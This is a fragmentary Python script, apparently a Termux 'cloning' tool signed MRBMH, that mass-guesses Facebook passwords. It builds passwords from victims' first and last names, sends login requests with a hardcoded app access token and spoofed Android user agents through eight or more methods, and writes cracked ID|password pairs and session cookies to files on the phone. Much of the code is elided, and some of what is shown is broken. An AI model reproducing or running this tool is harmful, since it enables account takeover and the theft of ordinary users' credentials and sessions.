...
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android 7.0.1;'
...
print('username is:\033[0;92mBMH')
...
while attemps < 12345677901:
    ...
    yourkey  = input(' \033[0;95mEnter Your Key: ')

    if username == 'BMH' and yourkey == 'du2838_fjro89':
...
logo=("""\033[1;91m
\033[1;92m  __  __ _____  ____  __  __ _    _
\033[1;97m |  \/  |  __ \|  _ \|  \/  | |  | |
\033[1;95m | \  / | |__) | |_) | \  / | |__| |
\033[1;95m | |\/| |  _  /|  _ <| |\/| |  __  |
\033[1;94m | |  | | | \ \| |_) | |  | | |  | |
\033[1;93m |_|  |_|_|  \_\____/|_|  |_|_|  | |
                                               MYANMAR(BY BMH)
\033[1;34m--------------------------------------------------
[~] Author   :\033[0;92m MRBMH
[~] Facebook :\033[0;94m BMH
[~] Tool     :\033[0;95m Free
[~] Version  :\033[0;93m 1.5
[~] Status   :\033[0;97m Good Luck
[~] Original :\033[0;92m By BMH
\033[1;35m----------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/MRBMH.txt  etc..')
				linex()
				...
				clear()
				print(' Do you show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' I LOVE YOU(Total account ids) : \033[1;32m'+total_ids+f' ')
...
def gmail():
		...
		clear()
		print('\033[1;37m example: aung, zaw, khant, min\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: myimt, win, kyaw \033[1;97m')
		linex()
		...
		pxc = input(' Choose : ')
		clear()
		print('\033[1;32m [1] \033[1;35mMethod  \033[1;32m \n [2] \033[1;35mMethod   \033[1;32m \n [3] \033[1;35mMethod    \033[1;32m \n [4] \033[1;35mMethod  \033[1;32m \n [5] \033[1;35mMethod   \033[1;32m \n [6] \033[1;35mMethod  ')
		linex()
		mthd = input(' Choose: ')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [MYANMAR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [MRBMH-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MRBMH-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [MRBMH-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/MRBMH-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcar/MRBMH-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MYANMAR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fbav = f'{random.randint(111,9999)}.0.0.{random.randint(111,99)}.{random.randint(111,999)}'
                        ...
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.1; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/MRBMH-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MRBMH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MRBMH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MYANMAR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(111,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/MRBMH-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/MRBMH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MYANMAR-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [MRBMH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MRBMH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MYANMAR-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MYANMAR-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [MRBMH-OK] %s | %s'%(ids,pas))
				open('/sdcard/MRBMH-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MYANMAR-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MYANMAR-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MRBMH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MRBMH-GMAIL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [MRBMH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MRBMH-GMAIL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MRBMH-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MRBMH-GMAIL-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [MRBMH-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/MRBMH-GMAIL-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MYANMAR-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [MRBMH-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [MRBMH-OK] '+uid+' | '+pas)
						open('/sdcard/MRBMH-GMAIL-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [MRBMH-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/MRBMH-GMAIL-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
